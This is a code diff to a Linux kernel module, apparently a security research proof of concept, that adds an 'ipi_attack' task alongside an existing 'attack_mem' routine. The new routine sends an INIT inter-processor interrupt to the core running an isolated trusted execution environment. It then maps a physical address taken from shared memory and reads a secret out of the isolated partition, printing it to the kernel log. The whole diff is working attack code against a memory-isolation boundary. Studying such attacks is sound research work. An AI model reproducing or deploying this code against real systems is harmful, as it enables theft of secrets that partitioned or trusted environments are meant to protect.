@@ -18,6 +18,7 @@ static u64 physical_entry_addr = 0;
 
 void ping_app(void);
 void attack_mem(enum tee_task task);
+void ipi_attack(void);
 
 static void tee_poll_timer_handler(struct timer_list *timer)
 {
@@ -39,6 +40,9 @@ static void tee_poll_timer_handler(struct timer_list *timer)
 			switch(SHARED_MEM_PTR->task_id) {
 				case TEE_T_PING:
 					ping_app();
+					break;
+				case TEE_T_ATTACK_IPI:
+					ipi_attack();
 					break;
 				case TEE_T_ATTACK_READ_MEM:
 				case TEE_T_ATTACK_WRITE_MEM:
@@ -88,31 +92,42 @@ void write_to_com_mem(void* buffer, size_t len) {
 
 void ipi_attack(void) {
 	unsigned long flags;
-	u64 pfn_start = physical_entry_addr >> 12;
-	u64 hash = 0;
+	u32 secret = 0;
+	u64 secret_phy_addr = 0;
+	u32 *secret_ptr = 0;
 
+	// Vector not yet initalized
+	if (0 == SHARED_MEM_PTR->memory[0]) { return; }
+	// The memory was initialized, we read
+	// The 8 bytes beginning at memory SHARED_MEM_PTR->memory[2] denote a 
+	// 64 bit physical memory addresss 
+	secret_phy_addr = *((u64*) &(SHARED_MEM_PTR->memory[2]));
+	/*
+	* We got the physical address and can calculate the page frame number 
+	* from it. The pages were already allocated (and never freed) when we 
+	* copied the Elf to memory.
+	*/
+
+	// Disable IRQ while sending IPI
 	local_irq_save(flags);
 
 	pr_info("Sending IPI to %d...\n", apic_id);
 	pr_info("TSC=%lld", __builtin_ia32_rdtsc());
 	lapic_send_init_ipi_waiting(apic_id);
-
+	
 	local_irq_restore(flags);
 
-	// Map all 2 MiB of memory allocated for the ELF (see. elf_reader)
-	// 2 MiB of memory, 4 Kib per page ~> 512 pages to map
-	for (size_t pfn_offset = 0; 512 > pfn_offset; ++pfn_offset) 
-	{
-		struct page* target_page = pfn_to_page(pfn_start + pfn_offset);
-		u32* base_addr = kmap(target_page);
-		// There are 1024 4-byte elements in one page
-		for (size_t offset = 0; offset < 1024; ++offset) 
-		{
-			hash += ioread32(base_addr + offset);
-		}
-		kunmap(target_page);
-	}
-	pr_info("Read all of TEECore's memory! All bytes added are: 0x%016llx\n", hash);
+	secret_ptr = (u32*) (((u64) kmap(pfn_to_page(secret_phy_addr >> 12))) | (secret_phy_addr & 0xFFF));
+	pr_info("Received phy. addr: 0x%016llx mapped to 0x%016llx\n", 
+		secret_phy_addr, (u64) secret_ptr);
+	pr_info("Attempt to read memory of isolated partition");
+	secret = ioread32(secret_ptr);
+	kunmap(pfn_to_page(secret_phy_addr >> 12));
+	
+	SHARED_MEM_PTR->task_id = TEE_T_ATTACK_IPI;
+	SHARED_MEM_PTR->status = TEE_C_HOSTSEND;
+
+	pr_info("Read the following secrets: 0x%08x", secret);
 }
 
 void ping_app(void) {
@@ -138,7 +153,6 @@ void attack_mem(enum tee_task task) {
 	u32 *secret_mem = NULL;
 	u32 num_iterations = secret_mem_size / sizeof(*secret_mem);
 
-	// We simply use the first byte of the payload to count the pings
 	// Vector not yet initalized
 	if (0 == SHARED_MEM_PTR->memory[0]) { return; }
 	// The memory was initialized, we read
